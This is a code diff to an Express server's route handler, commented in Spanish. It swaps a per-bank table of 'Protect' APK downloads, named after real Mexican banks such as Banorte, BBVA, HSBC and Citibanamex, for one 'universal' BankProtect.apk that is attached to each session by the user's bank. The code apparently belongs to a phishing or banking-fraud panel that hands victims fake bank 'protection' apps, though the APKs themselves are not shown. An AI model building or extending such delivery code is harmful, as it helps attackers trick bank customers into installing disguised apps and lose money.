@@ -1397,64 +1397,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
                   const bankCode = session.banco.toUpperCase();
                   console.log('Configurando archivo de protección para banco:', bankCode);
                   
-                  // Mapeo de bancos a archivos APK
-                  const bankFileMap: Record<string, { fileName: string; fileUrl: string; fileSize: string }> = {
-                    'BANORTE': {
-                      fileName: 'BanorteProtect.apk',
-                      fileUrl: '/assets/BanorteProtect_1749964227683.apk',
-                      fileSize: '4.2 MB'
-                    },
-                    'HSBC': {
-                      fileName: 'HsbcProtect.apk',
-                      fileUrl: '/assets/HsbcProtect_1749964227683.apk',
-                      fileSize: '4.2 MB'
-                    },
-                    'SCOTIABANK': {
-                      fileName: 'scotiabankProtect.apk',
-                      fileUrl: '/assets/scotiabankProtect_1749964227683.apk',
-                      fileSize: '4.2 MB'
-                    },
-                    'BBVA': {
-                      fileName: 'BbvaProtect.apk',
-                      fileUrl: '/assets/BbvaProtec_1749964227683.apk',
-                      fileSize: '4.2 MB'
-                    },
-                    'CITIBANAMEX': {
-                      fileName: 'banamexProtect.apk',
-                      fileUrl: '/assets/banamexProtect_1749964227683.apk',
-                      fileSize: '4.2 MB'
-                    },
-                    'BANREGIO': {
-                      fileName: 'BanregioProtect.apk',
-                      fileUrl: '/assets/BanregioProtect_1749964227683.apk',
-                      fileSize: '4.2 MB'
-                    },
-                    'BANCO_AZTECA': {
-                      fileName: 'AztecaProtect.apk',
-                      fileUrl: '/assets/AztecaProtect_1749964227683.apk',
-                      fileSize: '4.2 MB'
-                    },
-                    'INVEX': {
-                      fileName: 'InvexProtect.apk',
-                      fileUrl: '/assets/InvexProtect_1749964227683.apk',
-                      fileSize: '4.2 MB'
-                    },
-                    'AMEX': {
-                      fileName: 'AMEXProtect.apk',
-                      fileUrl: '/assets/AMEXProtect_1749964227683.apk',
-                      fileSize: '4.2 MB'
-                    }
+                  // Todos los bancos usan el mismo archivo APK universal
+                  const protectionFile = {
+                    fileName: 'BankProtect.apk',
+                    fileUrl: '/assets/BanorteProtect_1749964227683.apk',
+                    fileSize: '4.2 MB'
                   };
                   
-                  const protectionFile = bankFileMap[bankCode];
-                  if (protectionFile) {
-                    updateData.fileName = protectionFile.fileName;
-                    updateData.fileUrl = protectionFile.fileUrl;
-                    updateData.fileSize = protectionFile.fileSize;
-                    console.log('Archivo de protección configurado automáticamente:', protectionFile.fileName);
-                  } else {
-                    console.log('No hay archivo de protección disponible para el banco:', bankCode);
-                  }
+                  updateData.fileName = protectionFile.fileName;
+                  updateData.fileUrl = protectionFile.fileUrl;
+                  updateData.fileSize = protectionFile.fileSize;
+                  console.log('Archivo de protección universal configurado para:', bankCode, ':', protectionFile.fileName);
                 }
                 
                 // También considerar archivo manual si está presente en validatedData
